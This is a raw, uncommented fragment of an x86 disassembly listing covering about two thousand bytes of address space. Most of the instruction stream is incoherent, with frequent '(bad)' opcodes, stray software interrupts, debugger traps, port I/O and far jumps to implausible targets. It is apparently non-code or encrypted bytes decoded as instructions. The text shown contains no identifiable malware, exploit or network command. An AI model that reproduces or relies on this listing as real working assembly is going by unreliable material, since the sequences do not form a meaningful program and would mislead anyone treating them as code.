  4268c5:	adc    ecx,ebp
  4268c7:	xchg   esi,eax
  4268c8:	dec    esp
  4268c9:	int    0xe6
  4268cb:	dec    esp
  4268cc:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4268d2:	stc    
  4268d3:	shr    ecx,cl
  4268d5:	sub    BYTE PTR [ebx-0x27],dl
  4268d8:	mov    eax,0x9096cc0a
  4268dd:	inc    DWORD PTR [eax]
  4268df:	add    ch,cl
  4268e1:	lea    ecx,[ebp+ecx*8-0x6a]
  4268e5:	dec    esp
  4268e6:	cmp    esi,ecx
  4268e8:	shr    edx,cl
  4268ea:	sub    BYTE PTR [ebx],bh
  4268ec:	psrlq  mm5,mm3
  4268ef:	xchg   edx,eax
  4268f0:	push   ebx
  4268f1:	adc    ecx,ebp
  4268f3:	xchg   esi,eax
  4268f4:	dec    esp
  4268f5:	int    0xe6
  4268f7:	dec    esp
  4268f8:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  4268fe:	stc    
  4268ff:	shr    ecx,cl
  426901:	sub    BYTE PTR [ebx-0x27],dl
  426904:	mov    eax,0xa496cc0a
  426909:	inc    DWORD PTR [eax]
  42690b:	add    ch,cl
  42690d:	lea    esi,[eax]
  42690f:	int    0x96
  426911:	xor    BYTE PTR [ebx],bh
  426913:	icebp  
  426914:	cmp    ecx,DWORD PTR [edi]
  426916:	shr    edx,cl
  426918:	sub    bl,dl
  42691a:	jmp    0x4268ae
  42691c:	push   ebx
  42691d:	adc    ecx,ebp
  42691f:	xchg   esi,eax
  426920:	xor    ch,cl
  426922:	out    0x30,al
  426924:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  42692a:	xchg   edx,eax
  42692b:	shr    ecx,cl
  42692d:	sub    BYTE PTR [ebx-0x27],dl
  426930:	xchg   DWORD PTR [ebx],edx
  426932:	or     cl,bh
  426934:	adc    eax,0xcd0000ff
  426939:	lea    ecx,[ebp+ecx*8-0x6a]
  42693d:	dec    esp
  42693e:	int    0xe6
  426940:	mov    BYTE PTR [ebx],bh
  426942:	icebp  
  426943:	cmp    ecx,DWORD PTR [edi]
  426945:	shr    ebx,cl
  426947:	xchg   edx,eax
  426948:	shr    edx,cl
  42694a:	sub    BYTE PTR [ebx+0x13],dl
  42694d:	iret   
  42694e:	push   es
  42694f:	nop
  426950:	inc    DWORD PTR [eax]
  426952:	add    BYTE PTR [edx],cl
  426954:	add    eax,0xff1dcf
  426959:	add    bh,cl
  42695b:	jbe    0x42692d
  42695d:	mov    ebp,0x10d8
  426962:	int    0x8d
  426964:	xor    ch,cl
  426966:	xchg   esi,eax
  426967:	xor    al,al
  426969:	(bad)  
  42696a:	cmp    ecx,DWORD PTR [edi]
  42696c:	stos   BYTE PTR es:[edi],al
  42696d:	cmp    ebx,ecx
  42696f:	shr    ebx,cl
  426971:	xchg   edx,eax
  426972:	shr    edx,cl
  426974:	sub    BYTE PTR [ebx+0x13],dl
  426977:	or     al,BYTE PTR ds:0xff1dcf
  42697d:	add    ch,cl
  42697f:	jbe    0x4269cd
  426981:	int    0x8d
  426983:	dec    esp
  426984:	cmp    edi,DWORD PTR [ecx-0x2d]
  426987:	mov    ebp,0xd3f03b92
  42698c:	repnz sub BYTE PTR [ebx-0x2d],dl
  426990:	aam    0x3c
  426992:	iret   
  426993:	push   es
  426994:	adc    eax,0x700000ff
  426999:	int    0x76
  42699b:	xor    ch,cl
  42699d:	lea    esi,[eax]
  42699f:	cmp    edi,DWORD PTR [ecx-0x2d]
  4269a2:	mov    ebp,0xd3f03b92
  4269a7:	repnz sub BYTE PTR [ebx-0x2d],dl
  4269ab:	jo     0x42697c
  4269ad:	push   es
  4269ae:	and    al,0x0
  4269b0:	add    BYTE PTR [eax],al
  4269b2:	jo     0x426981
  4269b4:	jbe    0x4269ca
  4269b6:	rol    BYTE PTR [eax+0x76cdf100],0x4c
  4269bd:	int    0x8d
  4269bf:	dec    esp
  4269c0:	cmp    edi,DWORD PTR [ecx+0x3b]
  4269c3:	lock int 0xe6
  4269c6:	mov    bl,dl
  4269c8:	mov    ebp,0x28f2d392
  4269cd:	push   ebx
  4269ce:	ror    edi,cl
  4269d0:	iret   
  4269d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4269d2:	inc    DWORD PTR [eax]
  4269d4:	add    BYTE PTR [edx],cl
  4269d6:	int3   
  4269d7:	push   es
  4269d8:	sbb    eax,0xcf0000ff
  4269dd:	jbe    0x426a04
  4269df:	mov    ebp,0xeff5
  4269e4:	int    0x8d
  4269e6:	xor    ch,cl
  4269e8:	xchg   esi,eax
  4269e9:	xor    BYTE PTR [ebx],bh
  4269eb:	psrlq  mm5,mm3
  4269ee:	xchg   edx,eax
  4269ef:	add    al,0xfb
  4269f1:	call   ebx
  4269f3:	jmp    0xcf05:0xa135328
  4269fa:	sbb    eax,0x610000ff
  4269ff:	sub    esi,DWORD PTR ds:0x6a5d8080
  426a05:	xor    eax,0xab88080
  426a0a:	push   es
  426a0b:	jo     0x426a0d
  426a0d:	add    BYTE PTR [eax],al
  426a0f:	iret   
  426a10:	mov    dh,BYTE PTR [eax]
  426a12:	mov    eax,0xb4cf0a
  426a17:	add    BYTE PTR [eax],al
  426a19:	pop    ebp
  426a1a:	adc    BYTE PTR ds:0xab88080,dh
  426a20:	push   es
  426a21:	bound  eax,QWORD PTR [eax]
  426a23:	add    BYTE PTR [eax],al
  426a25:	int    0xd2
  426a27:	mov    eax,0x94060a
  426a2c:	add    BYTE PTR [eax],al
  426a2e:	int    0xd3
  426a30:	mov    eax,0x98060a
  426a35:	add    BYTE PTR [eax],al
  426a37:	add    al,0x6d
  426a39:	sub    ch,cl
  426a3b:	jge    0x4269f5
  426a3d:	or     cl,bh
  426a3f:	mov    eax,0xcf000000
  426a44:	mov    ch,BYTE PTR [eax]
  426a46:	mov    eax,0xbccf0a
  426a4b:	add    BYTE PTR [eax],al
  426a4d:	add    al,0xd3
  426a4f:	pusha  
  426a50:	mov    eax,0xc0cf0a
  426a55:	add    BYTE PTR [eax],al
  426a57:	iret   
  426a58:	mov    cl,BYTE PTR [edx-0x48]
  426a5b:	or     cl,bh
  426a5d:	les    eax,FWORD PTR [eax]
  426a5f:	add    BYTE PTR [eax],al
  426a61:	int    0xf9
  426a63:	mov    eax,0x9c670a
  426a68:	add    BYTE PTR [eax],al
  426a6a:	iret   
  426a6b:	loopne 0x426a0d
  426a6d:	pop    edi
  426a6e:	add    BYTE PTR ds:0xab88080,dh
  426a74:	iret   
  426a75:	enter  0x0,0x0
  426a79:	iret   
  426a7a:	mov    bh,bh
  426a7c:	mov    eax,0x90cf0a
  426a81:	add    BYTE PTR [eax],al
  426a83:	mov    eax,0xa0670a
  426a88:	add    BYTE PTR [eax],al
  426a8a:	add    al,0xc9
  426a8c:	stc    
  426a8d:	mov    eax,0xa4670a
  426a92:	add    BYTE PTR [eax],al
  426a94:	int    0xf9
  426a96:	pop    edi
  426a97:	leave  
  426a98:	xor    eax,0xab88080
  426a9d:	iret   
  426a9e:	add    BYTE PTR [eax],0x0
  426aa1:	add    ch,cl
  426aa3:	jge    0x426a5d
  426aa5:	or     cl,bh
  426aa7:	aam    0x0
  426aa9:	add    BYTE PTR [eax],al
  426aab:	int    0xc5
  426aad:	mov    eax,0xe0060a
  426ab2:	add    BYTE PTR [eax],al
  426ab4:	cmp    ebp,DWORD PTR [ebp-0x48]
  426ab7:	or     ah,BYTE PTR [edi-0x58]
  426aba:	add    BYTE PTR [eax],al
  426abc:	add    bh,cl
  426abe:	addr16 in al,0x0
  426ac1:	add    BYTE PTR [eax],al
  426ac3:	leave  
  426ac4:	push   es
  426ac5:	lods   al,BYTE PTR ds:[esi]
  426ac6:	add    BYTE PTR [eax],al
  426ac8:	add    dh,ah
  426aca:	xor    eax,0x6c9352b
  426acf:	fadd   DWORD PTR [eax]
  426ad1:	add    BYTE PTR [eax],al
  426ad3:	jae    0x426b0a
  426ad5:	jno    0x426b0c
  426ad7:	mov    eax,0x3076cdaf
  426adc:	int    0x8d
  426ade:	xor    ch,cl
  426ae0:	xchg   esi,eax
  426ae1:	xor    BYTE PTR [edx+eax*1],al
  426ae4:	call   ebx
  426ae6:	repnz sub BYTE PTR [ebx],bh
  426ae9:	jns    0x426abe
  426aeb:	mov    ebp,0xcdd35392
  426af0:	lea    esi,[eax]
  426af2:	add    al,0x2
  426af4:	(bad)  
  426af5:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426afb:	repz xchg edx,eax
  426afd:	push   ebx
  426afe:	jecxz  0x426b3b
  426b00:	retf   
  426b01:	add    al,0xd2
  426b03:	sbb    bl,BYTE PTR [ebx]
  426b05:	retf   
  426b06:	cmp    eax,DWORD PTR [eax]
  426b08:	inc    ebx
  426b09:	cli    
  426b0a:	das    
  426b0b:	or     cl,dl
  426b0d:	add    BYTE PTR [eax+0x43888280],0xd2
  426b14:	das    
  426b15:	add    al,0x37
  426b17:	add    BYTE PTR [eax+0x308dcd80],0xcd
  426b1e:	xchg   esi,eax
  426b1f:	xor    BYTE PTR [ebx],bh
  426b21:	psrlq  mm5,mm3
  426b24:	xchg   edx,eax
  426b25:	add    al,0xfb
  426b27:	call   ebx
  426b29:	jmp    0xcd7d:0x87135328
  426b30:	aad    0xb8
  426b32:	cmp    edx,DWORD PTR ds:0x708d
  426b38:	add    ch,cl
  426b3a:	lea    esi,[eax]
  426b3c:	int    0xe6
  426b3e:	xor    BYTE PTR [ebx],bh
  426b40:	psrlq  mm5,mm3
  426b43:	xchg   edx,eax
  426b44:	add    al,0xf8
  426b46:	call   ebx
  426b48:	jmp    0x8832be75
  426b4d:	jge    0x426b07
  426b4f:	int    0xcc
  426b51:	lea    esi,[eax+0x0]
  426b54:	add    BYTE PTR [eax],al
  426b56:	mov    eax,0xd3b8e3f8
  426b5b:	repnz das 
  426b5d:	mov    eax,0x53b8f3e3
  426b62:	jecxz  0x426b31
  426b64:	lea    esi,[eax]
  426b66:	int    0xe6
  426b68:	xor    BYTE PTR [ebx],bh
  426b6a:	psrlq  mm5,mm3
  426b6d:	xchg   edx,eax
  426b6e:	add    al,0xf8
  426b70:	call   ebx
  426b72:	jmp    0x8832be9f
  426b77:	jge    0x426b31
  426b79:	or     dl,BYTE PTR ds:0x708d
  426b7f:	add    ch,cl
  426b81:	lea    esi,[eax]
  426b83:	int    0x96
  426b85:	xor    BYTE PTR [ebx],bh
  426b87:	(bad)  
  426b89:	sti    
  426b8a:	call   ebx
  426b8c:	jmp    0x426b20
  426b8e:	shr    edx,cl
  426b90:	sub    BYTE PTR [ebx+0x13],dl
  426b93:	int    0x96
  426b95:	xor    BYTE PTR [edi+0x308dcdd3],al
  426b9b:	add    al,0x2
  426b9d:	(bad)  
  426b9e:	cmp    ebx,DWORD PTR [ecx-0x2cd70d2d]
  426ba4:	repz xchg edx,eax
  426ba6:	push   ebx
  426ba7:	jecxz  0x426be4
  426ba9:	retf   
  426baa:	add    al,0xd2
  426bac:	sbb    bl,BYTE PTR [ebx]
  426bae:	retf   
  426baf:	cmp    eax,DWORD PTR [eax]
  426bb1:	inc    ebx
  426bb2:	cli    
  426bb3:	das    
  426bb4:	or     ebp,DWORD PTR [esi+0x2f000000]
  426bba:	pop    es
  426bbb:	pop    ebx
  426bbc:	add    BYTE PTR [eax],al
  426bbe:	add    bl,al
  426bc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426bc1:	mov    esi,0x76cf4229
  426bc6:	jne    0x426bd2
  426bc8:	jbe    0x426b52
  426bca:	int    0x76
  426bcc:	mov    BYTE PTR [edi+0x13de37b6],bh
  426bd2:	or     bl,BYTE PTR [ecx+ecx*8]
  426bd5:	ins    BYTE PTR es:[edi],dx
  426bd6:	test   BYTE PTR [ebp-0x32dadcf6],bh
  426bdc:	jbe    0x426c53
  426bde:	int    0x8d
  426be0:	jge    0x426c11
  426be2:	inc    ebp
  426be3:	jge    0x426b77
  426be5:	shr    ebx,cl
  426be7:	xchg   edx,eax
  426be8:	int    0x8d
  426bea:	jne    0x426bb9
  426bec:	xchg   esi,eax
  426bed:	jge    0x426c2a
  426bef:	leave  
  426bf0:	cmp    ebx,edx
  426bf2:	push   ebx
  426bf3:	icebp  
  426bf4:	int    0x76
  426bf6:	cmc    
  426bf7:	bound  eax,QWORD PTR [ebp-0x7f7f7edb]
  426bfd:	jo     0x426bce
  426bff:	push   es
  426c00:	cmc    
  426c01:	inc    DWORD PTR [eax]
  426c03:	add    BYTE PTR [eax-0x2d],dh
  426c06:	repnz sub BYTE PTR [ebp+0xf2a3],bh
  426c0d:	int    0x76
  426c0f:	in     eax,dx
  426c10:	int    0x8d
  426c12:	adc    DWORD PTR [edi],ebp
  426c14:	inc    ebp
  426c15:	jge    0x426ba9
  426c17:	shr    ebx,cl
  426c19:	xchg   edx,eax
  426c1a:	int    0x8d
  426c1c:	in     eax,dx
  426c1d:	int    0x96
  426c1f:	adc    ebx,edx
  426c21:	repnz sub ch,cl
  426c24:	iret   
  426c25:	cmc    
  426c26:	inc    DWORD PTR [eax]
  426c28:	add    ch,cl
  426c2a:	mov    DWORD PTR [ebx],edi
  426c2c:	leave  
  426c2d:	cmp    ebx,edx
  426c2f:	push   ebx
  426c30:	rol    BYTE PTR [ebx+0x7d],cl
  426c33:	das    
  426c34:	push   es
  426c35:	push   ebp
  426c36:	add    BYTE PTR [eax-0xa293280],0xc9
  426c3d:	jbe    0x426c4c
  426c3f:	(bad)  
  426c40:	ficom  WORD PTR ss:[ebx]
  426c43:	pop    ebp
  426c44:	mov    ebp,0xa25230a
  426c49:	jbe    0x426c3c
  426c4b:	or     ah,BYTE PTR [esi-0x6289f56b]
  426c51:	int    0x76
  426c53:	xchg   ebp,eax
  426c54:	int    0x8d
  426c56:	popf   
  426c57:	das    
  426c58:	inc    ebp
  426c59:	jge    0x426bed
  426c5b:	shr    ebx,cl
  426c5d:	xchg   edx,eax
  426c5e:	int    0x8d
  426c60:	xchg   ebp,eax
  426c61:	int    0x96
  426c63:	popf   
  426c64:	cmp    ecx,ecx
  426c66:	cmp    ebx,edx
  426c68:	push   ebx
  426c69:	icebp  
  426c6a:	bound  eax,QWORD PTR [eax]
  426c6c:	(bad)  
  426c6d:	xor    al,0xd3
  426c6f:	repnz sub BYTE PTR [eax],al
  426c72:	pop    ecx
  426c73:	xor    eax,0xbd808081
  426c78:	push   eax
  426c79:	repnz add BYTE PTR [eax],al
  426c7c:	int    0x76
  426c7e:	xchg   ebp,eax
  426c7f:	int    0x8d
  426c81:	popf   
  426c82:	das    
  426c83:	inc    ebp
  426c84:	jge    0x426c18
  426c86:	shr    ebx,cl
  426c88:	xchg   edx,eax
  426c89:	int    0x8d
  426c8b:	xchg   ebp,eax
  426c8c:	int    0x96
  426c8e:	popf   
  426c8f:	cmp    ecx,ecx
  426c91:	cmp    ebx,edx
  426c93:	push   ebx
  426c94:	icebp  
  426c95:	bound  eax,QWORD PTR [eax]
  426c97:	pop    ecx
  426c98:	xor    eax,0xd3808081
  426c9d:	repnz sub BYTE PTR [eax],al
  426ca0:	pop    ecx
  426ca1:	sub    eax,0xbd808081
  426ca6:	xchg   edx,eax
  426ca7:	repnz add BYTE PTR [eax],al
  426caa:	int    0x7
  426cac:	xor    eax,0xcd808081
  426cb1:	mov    ch,cl
  426cb3:	jle    0x426d19
  426cb5:	xchg   DWORD PTR [eax-0x327772f6],ecx
  426cbb:	lea    ecx,ds:0x2ff176cd
  426cc1:	inc    ebp
  426cc2:	rcl    DWORD PTR [edx-0x326d422d],cl
  426cc8:	jbe    0x426cd7
  426cca:	int    0x96
  426ccc:	icebp  
  426ccd:	cmp    esi,eax
  426ccf:	shr    DWORD PTR [ebp+0x536d3b28],cl
  426cd5:	ror    ebp,cl
  426cd7:	lea    ecx,[eax+0x187ebb2f]
  426cdd:	push   es
  426cde:	jge    0x426cb4
  426ce0:	dec    esp
  426ce1:	int    0x7
  426ce3:	popf   
  426ce4:	add    DWORD PTR [eax+0x4180c980],0xcd358621
  426cee:	jbe    0x426d3c
  426cf0:	int    0x76
  426cf2:	xor    BYTE PTR [eax],al
  426cf4:	(bad)  
  426cf5:	cmp    al,0x0
  426cf7:	(bad)  
  426cf8:	cmc    
  426cf9:	add    dh,dl
  426cfb:	sub    al,0x0
  426cfd:	(bad)  
  426cfe:	and    al,0x0
  426d00:	(bad)  
  426d01:	sbb    al,0x0
  426d03:	(bad)  
  426d04:	adc    al,0xbd
  426d06:	test   ch,dh
  426d08:	add    BYTE PTR [eax],al
  426d0a:	or     al,BYTE PTR [esi]
  426d0c:	adc    edi,edi
  426d0e:	add    BYTE PTR [eax],al
  426d10:	int    0x76
  426d12:	cmp    al,0x4
  426d14:	fcom   QWORD PTR [eax+eax*4]
  426d17:	aam    0x1a
  426d19:	int    0x76
  426d1b:	cmp    al,0x4
  426d1d:	fsub   QWORD PTR [eax+eax*4]
  426d20:	aam    0x4e
  426d22:	int    0x6
  426d24:	adc    edi,edi
  426d26:	add    BYTE PTR [eax],al
  426d28:	int    0x8d
  426d2a:	cmp    al,0xa
  426d2c:	outs   dx,BYTE PTR ds:[esi]
  426d2d:	sbb    al,0xec
  426d2f:	push   ebx
  426d30:	add    dh,dl
  426d32:	cmp    al,0x0
  426d34:	(bad)  
  426d35:	cmc    
  426d36:	mov    ebp,0x6daa
  426d3b:	stos   BYTE PTR es:[edi],al
  426d3c:	test   al,0x63
  426d3e:	retf   
  426d3f:	shl    BYTE PTR [eax+eax*4],cl
  426d42:	xchg   esi,eax
  426d43:	int    0xed
  426d45:	jno    0x426db8
  426d47:	cwde   
  426d48:	leave  
  426d49:	jbe    0x426d48
  426d4b:	dec    ecx
  426d4c:	and    DWORD PTR [esi-0x68936cb],eax
  426d52:	inc    ecx
  426d53:	and    DWORD PTR [esi-0x28932cb],eax
  426d59:	int    0xd6
  426d5b:	std    
  426d5c:	sar    bh,0x5f
  426d5f:	shl    DWORD PTR [ecx],1
  426d61:	xchg   BYTE PTR ds:0x3ba0d33b,dh
  426d67:	sti    
  426d68:	sar    DWORD PTR [ebp+0x28b9d392],cl
  426d6e:	push   ebx
  426d6f:	jns    0x426d3e
  426d71:	(bad)  
  426d72:	mov    BYTE PTR [ebx+0x11],al
  426d75:	int    0x76
  426d77:	std    
  426d78:	aam    0xc4
  426d7a:	int    0xd6
  426d7c:	std    
  426d7d:	cmp    edx,ebx
  426d7f:	cmp    edi,ebx
  426d81:	sar    DWORD PTR [ecx-0x6d422cd8],cl
  426d87:	push   ebx
  426d88:	jns    0x426d57
  426d8a:	(bad)  
  426d8b:	dec    esp
  426d8c:	inc    ebx
  426d8d:	adc    esp,edx
  426d8f:	pop    ebx
  426d90:	int    0x96
  426d92:	xor    BYTE PTR [edx-0x32b31933],bl
  426d98:	jbe    0x426d22
  426d9a:	cmp    esi,edi
  426d9c:	push   es
  426d9d:	add    ah,dl
  426d9f:	push   esi
  426da0:	pop    ebx
  426da1:	retf   0x8624
  426da4:	or     DWORD PTR [esi-0x59a6d0d1],esp
  426daa:	das    
  426dab:	push   es
  426dac:	fcmovbe st,st(6)
  426dae:	dec    esi
  426daf:	add    al,0xf4
  426db1:	adc    DWORD PTR [edx],0xffffffc5
  426db4:	fwait
  426db5:	add    BYTE PTR [eax+0x2fa60980],0xec
  426dbc:	dec    esp
  426dbd:	adc    ch,ah
  426dbf:	in     eax,dx
  426dc0:	add    BYTE PTR [eax+0x2fa60980],0xf1
  426dc7:	lea    ebp,[edi]
  426dc9:	retf   0x2fa6
  426dcc:	or     DWORD PTR [esi+eax*4],esp
  426dcf:	js     0x426e14
  426dd1:	clc    
  426dd2:	or     BYTE PTR [esi],0x63
  426dd5:	int    0x76
  426dd7:	stc    
  426dd8:	cmp    edx,ebx
  426dda:	int    0x8d
  426ddc:	stc    
  426ddd:	add    al,0x2
  426ddf:	jmp    FWORD PTR [edx+0x76cd4aec]
  426de5:	std    
  426de6:	cmp    edx,ebx
  426de8:	int    0x8d
  426dea:	std    
  426deb:	cmp    edx,DWORD PTR [ebx]
  426ded:	shl    edx,cl
  426def:	sub    bl,dl
  426df1:	mov    ebp,0xa8d35392
  426df6:	retf   
  426df7:	ror    BYTE PTR [eax+eax*4-0x6a],cl
  426dfb:	int    0xed
  426dfd:	add    al,0xed
  426dff:	(bad)  
  426e00:	leave  
  426e01:	jbe    0x426e00
  426e03:	dec    ecx
  426e04:	and    DWORD PTR [esi+0x21416135],eax
  426e0a:	xchg   BYTE PTR ds:0xcdf9960a,dh
  426e10:	jbe    0x426e26
  426e12:	or     dh,BYTE PTR [esi+0x14]
  426e15:	int    0x76
  426e17:	adc    al,0xcd
  426e19:	add    DWORD PTR ds:0xcd808081,ebp
  426e1f:	lea    edx,[ecx*8+0x2d0acd80]
  426e26:	add    DWORD PTR [eax-0x78763280],0xa5b647c
  426e30:	lea    esi,[ebp-0x32028933]
  426e36:	(bad)  
  426e37:	std    
  426e38:	cwde   
  426e39:	call   0x3b85:0x82cfffc0
  426e40:	jns    0x426e15
  426e42:	mov    ebp,0xf03baa92
  426e47:	shl    edx,cl
  426e49:	sub    BYTE PTR [ebx-0x2d],dl
  426e4c:	or     dh,BYTE PTR [esi-0x63]
  426e4f:	int    0x76
  426e51:	std    
  426e52:	int    0x8d
  426e54:	std    
  426e55:	cmp    edi,DWORD PTR [ecx-0x2d]
  426e58:	mov    ebp,0xd3f03b92
  426e5d:	repnz sub BYTE PTR [ebx-0x2d],dl
  426e61:	or     dh,BYTE PTR [esi-0x53]
  426e64:	int    0x76
  426e66:	mov    ch,0xcd
  426e68:	ins    BYTE PTR es:[edi],dx
  426e69:	jo     0x426e6f
  426e6b:	mov    ebp,0xf1760a4c
  426e70:	int    0x76
  426e72:	mov    ch,0xcd
  426e74:	ins    BYTE PTR es:[edi],dx
  426e75:	pop    esp
  426e76:	int    0x8d
  426e78:	mov    ch,0x7c
  426e7a:	push   es
  426e7b:	outs   dx,BYTE PTR ds:[esi]
  426e7c:	xchg   esp,eax
  426e7d:	int    0x76
  426e7f:	mov    ch,0xd4
  426e81:	sbb    al,0xcd
  426e83:	ins    BYTE PTR es:[edi],dx
  426e84:	pop    esp
  426e85:	int    0x8d
  426e87:	mov    ch,0xcd
  426e89:	jle    0x426e1f
  426e8b:	jl     0x426e85
  426e8d:	icebp  
  426e8e:	sub    edi,DWORD PTR [ebp-0x33]
  426e91:	jbe    0x426e48
  426e93:	int    0x6c
  426e95:	pop    esp
  426e96:	xchg   ebx,edx
  426e98:	in     al,dx
  426e99:	xchg   ebp,ecx
  426e9b:	ins    BYTE PTR es:[edi],dx
  426e9c:	xchg   esp,eax
  426e9d:	or     dh,BYTE PTR [esi-0x43]
  426ea0:	int    0x76
  426ea2:	std    
  426ea3:	int    0x8d
  426ea5:	std    
  426ea6:	cmp    edi,DWORD PTR [ecx+0x3b]
  426ea9:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426eb0:	push   ebx
  426eb1:	ror    DWORD PTR [edx],cl
  426eb3:	jbe    0x426ec9
  426eb5:	int    0x76
  426eb7:	std    
  426eb8:	int    0x8d
  426eba:	std    
  426ebb:	cmp    edi,DWORD PTR [ecx+0x3b]
  426ebe:	lock shl edx,cl
  426ec1:	sub    bl,dl
  426ec3:	mov    ebp,0xad35392
  426ec8:	jbe    0x426ede
  426eca:	int    0x76
  426ecc:	std    
  426ecd:	int    0x8d
  426ecf:	std    
  426ed0:	cmp    esi,eax
  426ed2:	cmp    edi,DWORD PTR [ecx-0x2d]
  426ed5:	repnz sub bl,dl
  426ed8:	mov    ebp,0xcdd35392
  426edd:	lea    esi,[eax]
  426edf:	or     al,BYTE PTR [ecx-0x36eb69f6]
  426ee5:	jbe    0x426efb
  426ee7:	cmp    DWORD PTR [ecx],esp
  426ee9:	xchg   BYTE PTR ds:0xb21476c9,dh
  426eef:	and    DWORD PTR [esi+0x1476c935],eax
  426ef5:	imul   esp,DWORD PTR [ecx],0x36eb3586
  426efb:	xchg   BYTE PTR [eax-0x2893280],al
  426f01:	int    0x8d
  426f03:	std    
  426f04:	cmp    edi,DWORD PTR [ecx+0x3b]
  426f07:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426f0e:	push   ebx
  426f0f:	ror    DWORD PTR [edx],cl
  426f11:	jbe    0x426ec0
  426f13:	int    0x76
  426f15:	mov    ebp,0xa4c7687
  426f1a:	jbe    0x426eb9
  426f1c:	add    dh,dl
  426f1e:	popf   
  426f1f:	add    dh,dl
  426f21:	dec    esp
  426f22:	int    0x8d
  426f24:	mov    ch,0xbd
  426f26:	neg    bh
  426f28:	add    BYTE PTR [eax],al
  426f2a:	or     dh,BYTE PTR [esi+0x14]
  426f2d:	int    0x76
  426f2f:	adc    al,0x6
  426f31:	ins    DWORD PTR es:[edi],dx
  426f32:	aam    0x60
  426f34:	int    0x76
  426f36:	popf   
  426f37:	or     dh,BYTE PTR [esi-0x5b]
  426f3a:	int    0x76
  426f3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f3d:	int    0x8d
  426f3f:	dec    esp
  426f40:	xor    edx,ebx
  426f42:	or     dh,BYTE PTR [esi-0x5b]
  426f45:	int    0x76
  426f47:	adc    al,0xcd
  426f49:	lea    edx,[ecx*8+0x6e87306c]
  426f50:	dec    esp
  426f51:	int    0x8d
  426f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426f54:	inc    ebx
  426f55:	jge    0x426ed9
  426f57:	sbb    ch,cl
  426f59:	jbe    0x426f6f
  426f5b:	int    0x6c
  426f5d:	dec    esp
  426f5e:	int    0x8d
  426f60:	adc    al,0x87
  426f62:	outs   dx,BYTE PTR ds:[esi]
  426f63:	mov    ch,cl
  426f65:	lea    esp,[ebp-0x2e142ccd]
  426f6b:	test   DWORD PTR [eax+0x2149bf80],eax
  426f71:	xchg   BYTE PTR ds:0xc90da60a,dh
  426f77:	jbe    0x426ff6
  426f79:	inc    ecx
  426f7a:	and    DWORD PTR [esi+0x7576c935],eax
  426f80:	cmp    DWORD PTR [ecx],esp
  426f82:	xchg   BYTE PTR ds:0xb26d76c9,dh
  426f88:	and    DWORD PTR [esi+0xd76cf35],eax
  426f8e:	or     dh,BYTE PTR [esi-0xb]
  426f91:	iret   
  426f92:	jbe    0x427011
  426f94:	or     dh,BYTE PTR [esi+0x11]
  426f97:	iret   
  426f98:	jbe    0x42700f
  426f9a:	or     dh,BYTE PTR [esi+0x14]
  426f9d:	iret   
  426f9e:	jbe    0x42700d
  426fa0:	or     dh,BYTE PTR [esi-0x13]
  426fa3:	int    0x76
  426fa5:	std    
  426fa6:	int    0x8d
  426fa8:	std    
  426fa9:	cmp    edi,DWORD PTR [ecx+0x3b]
  426fac:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  426fb3:	push   ebx
  426fb4:	ror    DWORD PTR [edx],cl
  426fb6:	jbe    0x426f5d
  426fb8:	jmp    0x426fcd
  426fba:	xchg   DWORD PTR [eax-0x4d03ed80],eax
  426fc0:	and    DWORD PTR [esi-0x22fad0cb],eax
  426fc6:	xchg   DWORD PTR [eax+0x4cc080],eax
  426fcc:	(bad)  
  426fcd:	popf   
  426fce:	iret   
  426fcf:	jbe    0x426fa1
  426fd1:	jo     0x426f90
  426fd3:	xlat   BYTE PTR ds:[ebx]
  426fd4:	fild   WORD PTR [eax]
  426fd6:	add    ch,cl
  426fd8:	jbe    0x426fd3
  426fda:	int    0x8d
  426fdc:	stc    
  426fdd:	cmp    edi,DWORD PTR [ecx+0x3b]
  426fe0:	lock shl edx,cl
  426fe3:	sub    bl,dl
  426fe5:	mov    ebp,0xad35392
  426fea:	jbe    0x426f99
  426fec:	or     ah,BYTE PTR [esi-0x6a29ae6b]
  426ff2:	int    0x76
  426ff4:	xchg   ebp,eax
  426ff5:	sar    DWORD PTR [ebp-0x2c1ec46e],cl
  426ffb:	in     eax,0x28
  426ffd:	push   ebx
  426ffe:	popf   
  426fff:	or     ah,BYTE PTR [esi-0x689325b]
  427005:	int    0x8d
  427007:	stc    
  427008:	cmp    esi,eax
  42700a:	shl    edx,cl
  42700c:	sub    BYTE PTR [ebx],bh
  42700e:	jns    0x426fe3
  427010:	mov    ebp,0xcdd35392
  427015:	(bad)  
  427016:	stc    
  427017:	int    0x96
  427019:	stc    
  42701a:	cmp    ecx,DWORD PTR [edi]
  42701c:	cmp    ebx,ecx
  42701e:	shr    ebx,cl
  427020:	xchg   edx,eax
  427021:	shr    edx,cl
  427023:	sub    BYTE PTR [ebx+0x13],dl
  427026:	xchg   ebx,edx
  427028:	int    0x8d
  42702a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42702b:	or     ah,BYTE PTR [esi-0x2982bc9b]
  427031:	sub    ch,cl
  427033:	jbe    0x42702e
  427035:	int    0x8d
  427037:	stc    
  427038:	cmp    edi,DWORD PTR [ecx+0x3b]
  42703b:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427042:	push   ebx
  427043:	shl    DWORD PTR [eax-0x40],cl
  427046:	dec    esp
  427047:	iret   
  427048:	jbe    0x42701a
  42704a:	jo     0x427009
  42704c:	sti    
  42704d:	std    
  42704e:	add    BYTE PTR [eax],al
  427050:	int    0x76
  427052:	std    
  427053:	int    0x8d
  427055:	std    
  427056:	cmp    edi,DWORD PTR [ecx+0x3b]
  427059:	lock shl edx,cl
  42705c:	sub    bl,dl
  42705e:	mov    ebp,0xcdd35392
  427063:	lea    esp,[ebp+0x28d47d43]
  427069:	int    0x76
  42706b:	std    
  42706c:	int    0x8d
  42706e:	std    
  42706f:	cmp    edi,DWORD PTR [ecx+0x3b]
  427072:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427079:	push   ebx
